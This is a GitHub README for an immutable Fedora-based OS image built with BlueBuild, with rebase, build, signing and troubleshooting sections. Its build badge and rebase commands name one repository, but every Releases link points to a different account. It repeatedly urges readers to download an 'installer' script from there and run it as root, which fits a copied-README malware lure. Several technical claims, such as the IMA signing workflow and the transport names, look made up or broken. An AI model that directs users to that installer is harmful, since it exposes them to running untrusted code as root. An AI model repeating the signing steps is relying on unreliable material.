[![Releases](https://img.shields.io/badge/Releases-otariinae--os-blue?logo=github&style=for-the-badge)](https://github.com/Darkyknight374/otariinae-os/releases)

# Otariinae OS — Immutable Fedora-Based OCI Image for BlueBuild

[![bluebuild build badge](https://github.com/winsdominoes/otariinae-os/actions/workflows/build.yml/badge.svg)](https://github.com/winsdominoes/otariinae-os/actions/workflows/build.yml)  
[![Topics](https://img.shields.io/badge/topics-atomic%20%7C%20bluebuild%20%7C%20immutable-lightgrey?style=flat)]()  
[![OCI Image](https://img.shields.io/badge/OCI-Image-green?style=for-the-badge)]()

Otariinae OS is an immutable, Fedora-based image template tuned for BlueBuild and OCI distribution. It combines OSTree image delivery with a small curated package set and a clear upgrade path via rpm-ostree. Use it as a base image for appliances, kiosks, VMs, or containerized host OS.

Visit the Releases page to download the installer or assets:
https://github.com/Darkyknight374/otariinae-os/releases

<!-- Hero image -->
![Linux Immutable OS](https://upload.wikimedia.org/wikipedia/commons/3/35/Tux.svg)

Table of contents
- Features
- Quick links
- Installation (rebase flow)
- Download and run release installer
- How it works (OSTree, rpm-ostree, OCI)
- Build and test (BlueBuild)
- Customize and create your own image
- Image signing and verification (IMA, ostree-ima)
- Upgrades, rollback, and maintenance
- Common use cases
- Troubleshooting
- FAQ
- Contributing
- License
- References

Features
- Immutable root filesystem managed by OSTree.
- Delivered as OCI images for registries and BlueBuild pipelines.
- rpm-ostree rebase path to move between unsigned and signed images.
- Minimal default package set with common tools for system tasks.
- Support for IMA-based signed image verification.
- Designed for reproducible builds and CI with BlueBuild.
- Easy to customize via layered package manifests and container image builds.

Quick links
- Repository: otariinae-os
- CI Build Badge: top of this document
- Releases (download and run the installer): https://github.com/Darkyknight374/otariinae-os/releases
- BlueBuild docs: https://blue-build.org/how-to/setup/

Installation (rebase flow)

This section shows the standard rebase flow for an existing rpm-ostree atomic Fedora installation. The flow uses an unsigned image first, then switches to a signed image. That ensures signing keys and policies install correctly before you lock to a signed OSTree.

Prepare: confirm your host runs rpm-ostree and supports OSTree images.

1. Rebase to the unsigned image
- Use the unverified registry transport to fetch the unsigned image that contains keys and policies:
```
sudo rpm-ostree rebase ostree-unverified-registry:ghcr.io/winsdominoes/otariinae-os:latest
```

2. Reboot to complete the rebase
- Reboot the host to switch the booted deployment:
```
sudo systemctl reboot
```

3. Rebase to the signed image
- After the first boot, rebase to the signed image. This enforces IMA-based verification:
```
sudo rpm-ostree rebase ostree-ima:ghcr.io/winsdominoes/otariinae-os:latest
```

4. Confirm deployments and booted state
```
rpm-ostree status
```

Download and run release installer

Visit the releases page and download the installer or asset that matches your platform. The releases page hosts release assets such as installer scripts, image tarballs, and checksums.

- Open: https://github.com/Darkyknight374/otariinae-os/releases
- Download the installer asset (for example, an installer script or signed image tarball).
- Make the installer executable and run it:
```
chmod +x ./otariinae-os-installer.sh
sudo ./otariinae-os-installer.sh
```

Replace the filename with the actual asset name you download from the Releases page. The installer prepares target storage, writes OSTree deployments or places OCI images into registries, and optionally configures grub and systemd-boot entries.

How it works (OSTree, rpm-ostree, OCI)

Key concepts
- OSTree: A version control system for operating system binaries. It stores filesystem trees as content-addressed commits. OSTree allows atomic deployments, rollbacks, and layered content.
- rpm-ostree: A hybrid image/package manager. It composes RPM packages into OSTree commits and provides the rebase and layering workflow for system updates.
- OCI: Open Container Initiative image spec. It stores filesystem layers and manifests and allows container registries to host system images that OSTree can consume via registry transports.
- IMA: Integrity Measurement Architecture. It allows boot-time verification of file integrity through signatures or allow-lists.

Delivery model
1. Build pipeline produces an OCI image that contains an OSTree commit, a manifest, and metadata.
2. CI publishes the OCI image to a registry (for example, GitHub Container Registry ghcr.io).
3. Clients use rpm-ostree rebase with ostree-unverified-registry or ostree-ima transport to consume the image.
4. System boots into the new OSTree deployment. rpm-ostree arranges systemd boot entries and switches root on reboot.

Build and test (BlueBuild)

This repository template integrates with BlueBuild CI to automate image creation. The pipeline uses container build tools to assemble a reproducible OSTree commit and then packages it into an OCI image.

Common CI steps
- Checkout source and manifest.
- Build the OSTree commit with mock or containerized rpm-ostree compose.
- Export the OSTree commit to container filesystem layers.
- Generate OCI manifest and push to registry.
- Tag release artifacts and publish them under GitHub Releases.

Local test steps
- Install build dependencies: rpm-ostree-toolbox, podman or docker, ostree.
- Compose a local commit:
```
./scripts/compose-local.sh --manifest manifests/default.yaml --output ./artifacts
```
- Export to a local OCI registry (example uses podman):
```
podman load -i ./artifacts/otariinae-os.tar
podman tag otariinae-os:local localhost:5000/otariinae-os:latest
podman push localhost:5000/otariinae-os:latest
```
- Test rebase against local registry:
```
sudo rpm-ostree rebase ostree-unverified-registry:localhost:5000/otariinae-os:latest
sudo systemctl reboot
```

Customize and create your own image

You can adapt this template to produce a custom image. The main customization points include the package manifest, OSTree commit options, spinning images for different architectures, and image entrypoint or system services.

Package manifests
- The manifest defines the RPMs you include in the image.
- Keep the base minimal to reduce attack surface and image size.
- Add packages for the use case: appliance, container host, developer workstation.

Example manifest fragment
```
packages:
  - kernel
  - bash
  - openssh-server
  - cloud-init
  - sudo
  - chrony
  - iputils
```

Custom services
- Include systemd unit files in the OSTree tree under /etc/systemd/system or /usr/lib/systemd/system depending on package layout.
- Enable units by creating drop-in unit files or by using rpm-ostree overrides.

Image variants
- Create variants by changing package set and image labels. Use CI to produce variant tags, for example:
  - otariinae-os:base
  - otariinae-os:desktop
  - otariinae-os:edge

Image size and pruning
- Trim image size by removing documentation, locale files, and unused libraries.
- Use rpm-ostree compose hooks to prune unnecessary files during compose.

Image signing and verification (IMA, ostree-ima)

This repo supports a signing workflow that uses IMA and ostree-ima transport. The workflow separates two stages:
- Stage 1: Deploy an unsigned image to install signing keys and policies. That uses ostree-unverified-registry.
- Stage 2: Rebase to the signed image that enforces IMA at boot via ostree-ima.

Key steps for signing
1. Create an IMA policy and signing key pair.
2. Sign the OSTree commit with the private key.
3. Publish the signed image to a registry under ostree-ima transport.
4. On clients, rebase first to an unsigned image that contains the public key and policy.
5. Rebase to the signed image to enable verification.

Signing commands (example)
```
# Create keys
openssl genpkey -algorithm RSA -out ima.key -pkeyopt rsa_keygen_bits:4096
openssl rsa -pubout -in ima.key -out ima.pub

# Sign ostree commit
ostree --repo=repo commit -b refs/heads/otariinae --tree=dir=deploy-root
ostree --repo=repo gpg-sign -s ima.key -m "otariinae signed commit" refs/heads/otariinae

# Export and push signed image (containerize the repo and push to registry)
```

Upgrades, rollback, and maintenance

Upgrades
- rpm-ostree performs an atomic upgrade by writing a new OSTree deployment and creating a new boot entry.
- The new deployment becomes active after reboot.
- You can use rpm-ostree update to pull updates for native repositories.

Rollback
- OSTree stores deployments as commits. You can roll back to a previous deployment:
```
sudo rpm-ostree rollback
sudo systemctl reboot
```
- The rollback resets the booted deployment to the previous commit.

Maintenance tips
- Keep your feed of base packages lean.
- Test upgrades in a staging environment before production.
- Monitor boot performance after image changes.

Common use cases

1. Appliance image
- Use Otariinae OS to host a single-purpose appliance. Lock packages and services to a tight set.
- Use IMA to ensure files are unchanged.

2. Kiosk or fixed-purpose workstation
- Disable package manager write access for standard users.
- Enable auto-login and app launch via systemd service.

3. Edge device
- Use air-gapped update patterns by shipping signed images.
- Use hardware-backed signing if available.

4. VM template
- Produce a small OSTree image to deliver a reproducible VM image across clouds.
- Provide cloud-init for first boot customization.

Troubleshooting

Boot fails or kernel missing
- Check grub or systemd-boot entry created by rpm-ostree.
- Run journalctl -b -1 to view previous boot logs.
- Confirm OSTree deployment contains kernel packages.

Rebase fails to fetch image
- Validate the registry URL and image tag.
- For local testing, ensure podman/dockerd and a local registry run.
- For public registries, confirm authentication if needed.

Signed image does not verify
- Confirm public key and IMA policy installed in the first-stage unsigned image.
- Verify the signature on the OSTree commit locally with ostree verify or ostree gpg-verify.
- Confirm the ostree-ima transport string matches published metadata.

rpm-ostree reported conflict or package missing
- Inspect package layering or rpm-ostree overrides.
- Recreate the compose manifest and run a clean compose.

Networking issues after rebase
- Confirm network service units are enabled and that NetworkManager or systemd-networkd is configured.
- Check for missing firmware or NIC drivers in the image.

FAQ

Q: What makes Otariinae OS immutable?
A: The root filesystem composes into an OSTree commit. The system boots from that commit, and the commit is read-only. You update by switching to a new commit. This enforces a known, repeatable state.

Q: How do I add a package?
A: Add the package name to the manifest under packages. Rebuild the image, publish it, and rebase the host to the new image.

Q: Can I run containers on Otariinae OS?
A: Yes. Otariinae OS supports container runtimes installed as packages. Keep the runtime and user-space tooling in the image or in a layered deployment.

Q: How do I test upgrades before rebooting?
A: Use rpm-ostree status to see staged deployments. Use a test environment or VM to apply the rebase and ground-truth the new deployment before pushing to production.

Q: Where do I get the installer or image artifacts?
A: Download release assets from the Releases page:
https://github.com/Darkyknight374/otariinae-os/releases
Pick the asset that matches your platform and follow the included instructions to execute the installer file you download.

Q: Are container registries required?
A: No. You can publish images to a file server or local registry. The ostree-unverified-registry transport can fetch from a registry. For signed images, use ostree-ima transport.

Contributing

We welcome contributions that improve documentation, CI, and image stability. Use the following workflow:

1. Fork the repository.
2. Create a feature branch named for your change.
3. Add tests or CI adjustments as needed.
4. Open a pull request with a clear description and the intended impact.

PR checklist
- The change builds on CI.
- The manifest stays minimal where possible.
- You update documentation for any new feature or change.

Code style
- Keep scripts simple and portable.
- Use shell scripts that avoid bash-specific features where sh is sufficient.
- Document steps and parameters for scripts.

Maintainers
- Repository maintainers review CI logs and merges.
- Use issues for bug reports and feature requests. Label issues clearly.

License

This project uses a permissive open source license. See the LICENSE file in the repository for the exact terms.

References and resources

- BlueBuild docs: https://blue-build.org/how-to/setup/
- OSTree: https://ostree.readthedocs.io
- rpm-ostree: https://www.projectatomic.io
- IMA: https://wiki.linuxfoundation.org/ima
- OCI image spec: https://github.com/opencontainers/image-spec

Badges and topics

Use the following topics for repository discoverability: atomic, bluebuild, bluebuild-image, custom-image, image-based, immutable, linux, linux-custom-image, oci, oci-image, operating-system

Release artifacts and automation

CI automates the following:
- Build OSTree commits from manifests.
- Containerize commits and create OCI images.
- Push images to registries.
- Create GitHub Releases with artifacts and checksums.

When the CI publishes a release, the Releases page will contain installers and image tarballs. Download the appropriate asset and run the included installer. Example:
```
# after download
chmod +x ./otariinae-os-installer-<version>.sh
sudo ./otariinae-os-installer-<version>.sh
```
Replace <version> with the file you download from the Releases page.

Practical examples and patterns

Edge device OTA flow
- Build signed images with OSTree commit signatures.
- Publish to registry and tag release channels by device class.
- Devices perform staged rebase to unsigned image to install keys, then to signed images routinely.
- Provide a management server that tracks which devices run which image version.

CI / BlueBuild pipeline snippet (conceptual)
- checkout
- setup build container
- run rpm-ostree compose
- export to OCI
- sign image artifacts
- push to ghcr.io
- create github release with artifacts

Security notes

Keep the attack surface small by restricting packages. Use IMA to enforce file integrity. Keep signing keys secure. Rotate keys when needed. Use hardware-backed keys if available.

Debugging commands

- Show rpm-ostree status:
```
rpm-ostree status --verbose
```
- List OSTree commits:
```
ostree --repo=/var/lib/ostree/repo rev-list --refs
```
- Verify OSTree commit signature:
```
ostree --repo=/var/lib/ostree/repo gpg-verify <commit>
```
- Check systemd logs:
```
journalctl -b
```

Packaging tips

- If you need to include vendor-provided drivers, package them as a layered rpm and include in a variant.
- Prefer out-of-tree drivers only when necessary.
- Use package modularity to separate optional features.

Automation and infra

- Use a staging registry for release candidates.
- Use ephemeral VMs in CI to validate boot paths and rebase flows.
- Record checksums and signatures in release metadata for audit.

Images and artwork

Use neutral, open-licensed artwork. Keep UI elements minimal. Host iconography on a CDN or within the repo under assets/.

Assets
- Png/SVG logos should remain under assets/ for reuse in docs and installers.
- Keep file sizes small for quick downloads.

Metadata and tagging

Follow semver-like tags for images:
- otariinae-os:v1.2.3
- otariinae-os:stable
- otariinae-os:edge

Link back to the Releases page for downloads and assets:
[![Download Release](https://img.shields.io/badge/Download%20Installer-Release-blue?logo=github&style=for-the-badge)](https://github.com/Darkyknight374/otariinae-os/releases)

This link will take you to the Releases page where you can download the installer asset that corresponds to your platform. Make the downloaded file executable and run it with root privileges to install or deploy Otariinae OS on target hardware or a VM.

Development roadmap

Planned items
- Multi-arch official images.
- Better cloud-init integration for cloud images.
- Hardware-backed signing support.
- A minimal GUI variant for kiosk use.

Stable items
- Signed image workflows.
- BlueBuild pipeline templates.
- Basic variant manifests and example overrides.

References and learning material

- OSTree concepts and commands: ostree.readthedocs.io
- rpm-ostree architecture and docs: projectatomic.io
- IMA design: linuxfoundation.org
- OCI image specification: opencontainers.org

End of file.